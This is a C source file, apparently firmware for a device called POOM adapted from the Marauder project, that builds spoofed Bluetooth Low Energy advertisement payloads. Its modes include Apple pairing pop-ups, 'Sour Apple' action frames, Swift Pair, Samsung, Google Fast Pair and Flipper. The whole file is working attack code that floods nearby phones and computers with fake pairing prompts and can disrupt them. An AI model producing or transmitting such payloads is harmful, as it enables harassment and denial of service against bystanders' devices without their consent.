// SPDX-License-Identifier: MIT
// Copyright (c) 2026 THE POOM
// Current universal payload formats adapted from Just Call Me Koko's Marauder.
// See README.md and LICENSE-MARAUDER for revision, corrections and attribution.
#include "poom_ble_payload.h"
#include <stdio.h>
#include <string.h>

static const char *const mode_names[] = {"Apple Devices", "Apple Juice", "Sour Apple", "Swift Pair",
    "Samsung", "Google Fast Pair", "Flipper", "All Families"};
static const uint8_t apple_models[] = {2,14,10,15,19,20,3,11,12,17,16,5,6,9,23,18,22};
static const char *const apple_names[] = {"AirPods", "AirPods Pro", "AirPods Max", "AirPods Gen 2", "AirPods Gen 3",
    "AirPods Pro Gen 2", "Power Beats", "Power Beats Pro", "Beats Solo Pro", "Beats Studio Buds", "Beats Flex",
    "Beats X", "Beats Solo 3", "Beats Studio 3", "Beats Studio Pro", "Beats Fit Pro", "Beats Studio Buds Plus"};
static const uint8_t actions[] = {0x27,0x09,0x02,0x1e,0x2b,0x2f,0x01,0x06,0x20};
static const uint16_t juice_models[] = {0x0220,0x0f20,0x1320,0x1420,0x0e20,0x0a20,0x0055,0x0c20,0x1120,0x0520,0x1020,0x0920,0x1720,0x1220,0x1620};
static const uint8_t watch_models[] = {0x1a,0x02,0x03,0x06,0x07,0x08,0x09,0x0b,0x0c,0x11,0x12,0x14,0x16,0x17,0x1c,0x1d,0x20};
static uint32_t random_(uint32_t *seed)
{
    *seed = *seed * UINT32_C(1664525) + UINT32_C(1013904223);
    return *seed;
}
const char *poom_ble_spam_mode_name(poom_ble_spam_mode_t mode)
{
    return (unsigned)mode < POOM_BLE_SPAM_MODE_COUNT ? mode_names[mode] : "Invalid";
}
size_t poom_ble_payload_build(poom_ble_spam_mode_t mode, uint32_t sequence, uint32_t entropy,
                             uint8_t output[31], char label[24])
{
    if(!output || !label || (unsigned)mode >= POOM_BLE_SPAM_MODE_COUNT) return 0;
    memset(output,0,31);
    memset(label,0,24);
    if(mode == POOM_BLE_SPAM_ALL) mode = (poom_ble_spam_mode_t)(sequence % POOM_BLE_SPAM_ALL);
    (void)snprintf(label,24,"%s",poom_ble_spam_mode_name(mode));
    switch(mode) {
    case POOM_BLE_SPAM_APPLE_DEVICES: {
        const uint8_t base[31] = {0x1e,0xff,0x4c,0,7,0x19,7,2,0x20,0x75,0xaa,0x30,1,0,0,0x45,0x12,0x12,0x12};
        memcpy(output,base,sizeof(base));
        const size_t index = sequence % (sizeof(apple_models) / sizeof(apple_models[0]));
        output[7] = apple_models[index];
        (void)snprintf(label,24,"%s",apple_names[index]);
        return sizeof(base);
    }
    case POOM_BLE_SPAM_APPLE_JUICE: case POOM_BLE_SPAM_SOUR_APPLE:
        if(sequence % 10) {
            const uint8_t base[] = {0x0a,0xff,0x4c,0,0x0f,5,0xc0,0,0,0,0};
            memcpy(output,base,sizeof(base));
            output[7] = actions[random_(&entropy) % sizeof(actions)];
            for(unsigned i=8;i<11;++i) output[i]=(uint8_t)(random_(&entropy)>>24);
            return sizeof(base);
        } else {
            const uint8_t base[] = {0x14,0xff,0x4c,0,7,0x0f,0,0,0,0xac,0x90,0x85,0x75,0x94,0x65,0,0,0,0,0,0};
            memcpy(output,base,sizeof(base));
            const uint16_t model=juice_models[random_(&entropy) % (sizeof(juice_models)/sizeof(juice_models[0]))];
            output[7]=(uint8_t)(model>>8);output[8]=(uint8_t)model;
            for(unsigned i=15;i<20;++i)output[i]=(uint8_t)(random_(&entropy)>>24);
            return sizeof(base);
        }
    case POOM_BLE_SPAM_SWIFT_PAIR: {
        const uint8_t base[] = {11,0xff,6,0,3,0,0x80};
        memcpy(output,base,sizeof(base));
        for(unsigned i=7;i<12;++i)output[i]=(uint8_t)('A'+random_(&entropy)%26);
        return 12;
    }
    case POOM_BLE_SPAM_SAMSUNG: {
        const uint8_t base[] = {14,0xff,0x75,0,1,0,2,0,1,1,0xff,0,0,0x43,0};
        memcpy(output,base,sizeof(base));
        output[14]=watch_models[sequence % sizeof(watch_models)];
        return sizeof(base);
    }
    case POOM_BLE_SPAM_FAST_PAIR: {
        const uint8_t base[] = {3,3,0x2c,0xfe,6,0x16,0x2c,0xfe,0,0xb7,0x27,2,0x0a,0};
        memcpy(output,base,sizeof(base));
        /* Fixed advertised metadata instead of upstream's random -100..19 field.
         * This is a payload simulation, not a measurement of C5 transmit power. */
        return sizeof(base);
    }
    case POOM_BLE_SPAM_FLIPPER: {
        const uint8_t base[] = {2,1,6,6,9,0,0,0,0,0,3,2,0x81,0x30,2,0x0a,0,9,0xff,0xba,0x0f,0x4c,0x75,0x67,0x26,0xe1,0x80};
        memcpy(output,base,sizeof(base));
        for(unsigned i=5;i<10;++i)output[i]=(uint8_t)('a'+random_(&entropy)%26);
        output[12]=(uint8_t)(0x81 + sequence%3);
        return sizeof(base); /* Manufacturer length9 accounts for ALL eight data bytes. */
    }
    default: return 0;
    }
}
